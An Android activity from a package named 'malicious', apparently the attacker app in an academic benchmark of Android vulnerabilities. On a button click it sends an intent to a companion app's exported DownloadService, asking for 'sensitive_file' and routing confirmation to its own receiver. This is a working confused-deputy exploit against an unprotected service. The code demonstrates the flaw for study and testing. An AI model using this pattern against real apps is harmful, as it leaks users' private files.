package edu.ksu.cs.malicious;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (checkPermission("android.permission.READ_EXTERNAL_STORAGE", android.os.Process.myPid(), android.os.Process.myUid()) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "android.permission.READ_EXTERNAL_STORAGE already granted");
        } else {
            Log.d(TAG, "need android.permission.READ_EXTERNAL_STORAGE permission");
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE"}, 100);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        findViewById(R.id.serviceButton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("edu.ksu.cs.benign", "edu.ksu.cs.benign.DownloadService");
                intent.setPackage("edu.ksu.cs.benign");
                intent.putExtra("filename", "sensitive_file");
                Log.d(TAG, getPackageName());
                intent.putExtra("confirmationPackage", getPackageName());
                intent.putExtra("confirmationReceiver", "edu.ksu.cs.malicious.ConfirmationReceiver");
                try {
                    startService(intent);
                } catch (SecurityException e) {
                    e.printStackTrace();
                    throw new RuntimeException("Security Exception occurred");
                }
            }
        });
    }
}
